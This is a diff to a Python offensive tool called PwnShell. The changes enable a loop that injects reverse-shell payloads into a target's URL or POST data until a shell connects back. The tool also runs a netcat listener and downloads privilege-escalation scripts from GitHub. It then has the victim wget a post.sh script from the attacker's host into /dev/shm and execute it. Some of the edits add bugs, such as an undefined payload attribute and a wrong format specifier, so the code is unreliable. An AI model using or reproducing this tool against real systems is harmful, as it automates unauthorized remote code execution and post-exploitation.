@@ -27,14 +27,15 @@ class PwnShell:
         self.method = args.method
         self.data = args.data
         self.authentication = args.auth
+        self.typ=args.type
         ########################################################################
         ###################### Specifying OS ###################################
-        if args.type == "linux" or args.type == "l":
+        if self.typ == "linux" or self.typ == "l":
             self.shell_linux()
-        elif args.type == "windows" or args.type == "w":
+        elif self.typ == "windows" or self.typ == "w":
             self.shell_windows()
         else:
-            print("[!]Invalid Value -> " + args.type)
+            print("[!]Invalid Value -> " + self.typ)
             exit_gracefully()
         ######################################################################
 
@@ -45,14 +46,14 @@ class PwnShell:
         if self.authentication:
             print('[*]USERNAME : %s' % self.authentication[0])
             print('[*]PASSWORD : %s' % self.authentication[1])
-        print('\n#Waiting for a Connection ....\n')
+        print('\n[!]Waiting for a Connection ....\n')
 
     #########################################################################################
     ###################################  LINUX #########################################
 
     def shell_linux(self):  # Default option
         self.info()
-        # login()
+        #self.login()
         self.is_valid()
         self.thread()  # leave it the last one
 
@@ -66,11 +67,16 @@ class PwnShell:
     ##########################  CHECK IF IP & PORT IS VALID ############################
 
     def is_valid(self):  # Checking if the ip address is valid
+        print(self.port)
         try:
             ipaddress.ip_address(self.ip)
-            return True
+            if self.port <= 65535 :
+                return True
+            else:
+                print("[!]Invalid PORT NUMBER -> %d"%self.port)
+                exit_gracefully()
         except ValueError:
-            print("\n[!]Invalid IP : " + self.ip)
+            print("\n[!]Invalid IP : %d"%self.ip)
             exit_gracefully()
 
     #########################################################################################
@@ -80,7 +86,7 @@ class PwnShell:
         nc = nclib.Netcat(listen=('', self.port), verbose=True)
         print('\n[*]Downloading PrivESC Scripts From Github..')
         os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o docker-privesc.sh 2>/dev/null')
-        time.sleep(10)
+        time.sleep(5)
         send = f'''wget -P /dev/shm http://{self.ip}:9002/post.sh ; clear'''
         nc.send_line(send.encode("utf-8"))
         send=f'''chmod +x /dev/shm/post.sh ; clear ; /dev/shm/post.sh {self.ip}'''
@@ -128,25 +134,24 @@ class PwnShell:
     ############################################################################################
     ###################################  LOOPING THE PAYLOADS #################################
     def send_payload(self):
-        pass
-#        payloads = PayLoads(self.ip, self.port).payloads()
-#        if self.method == 'post':
-#            for payload in payloads:
-#                self.req_post(payload)
-#                time.sleep(5)
-#                if self.is_port_in_use():
-#                    break
-#                # Here we have to stop the loop after getting a shell in the second thread
-#        elif self.method == 'get':
-#            print('get method')
-#            for payload in payloads:
-#                self.req_get(payload)
-#        else:
-#            return False
+        payloads = PayLoads(self.ip, self.port).payloads()
+        if self.method == 'post':
+            for payload in payloads:
+                self.req_post(payload)
+                time.sleep(5)
+                if self.is_port_in_use():
+                    break
+                # Here we have to stop the loop after getting a shell in the second thread
+        elif self.method == 'get':
+            print('get method')
+            for payload in payloads:
+                self.req_get(payload)
+        else:
+            return False
     #########################################################################################
     ###################################  POST METHOD #########################################
     def req_post(self, payload):
-        #print(f'Trying: {payload}')
+        print(f'Trying: {payload}')
         encoded_payload = self.get_url_encoded_payload(payload)
         url = self.domain.replace('PWNME', encoded_payload)  # payoad will be the revshells
         proxies = {'http': 'http://127.0.0.1:8080'}
@@ -156,10 +161,8 @@ class PwnShell:
                    "Upgrade-Insecure-Requests": "1",
                    'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
         cookies = ''
-        # data_parsed=data.replace("PWNME",payload) #Don't change it works perfectly
-        # r = requests.post(url)
         if self.data:
-            data_parsed = self.data.replace("PWNME", payload)  # Don't change
+            data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't change
         else:
             data_parsed = None
         r = requests.post(url, headers=headers, data=data_parsed,cookies=cookies)
@@ -167,9 +170,12 @@ class PwnShell:
     #########################################################################################
     ###################################  GET METHOD #########################################
     def req_get(self, payload):
-        url = self.domain.replace('PWNME', '127.0.0.1')  # payload will be the revshells
+        print(f'Trying: {payload}')
+        encoded_payload = self.get_url_encoded_payload(payload)
+        url = self.domain.replace('PWNME', self.payload)  # payload will be the revshells
+        proxies = {'http': 'http://127.0.0.1:8080'}
         cookies = ''
-        r = requests.get(url)
+        r = requests.get(url, cookies=cookies)
 
     #########################################################################################
     ###################################  LOGIN   ############################################
@@ -228,11 +234,7 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         exit_gracefully()
 
-# TODO
-# add payloads to a list or a dict for iteration
-# see how to get the headers automatically and send them instead of writing them manually
-# Add login form with a session
-# Add customization for cookies & Headers
-# Add the payload generator
-# Add an exit message to break instead of errors
-# Mandatory method
+#TODO
+#Add login form with a session
+#Stop loop when getting a connection
+#Work on windows
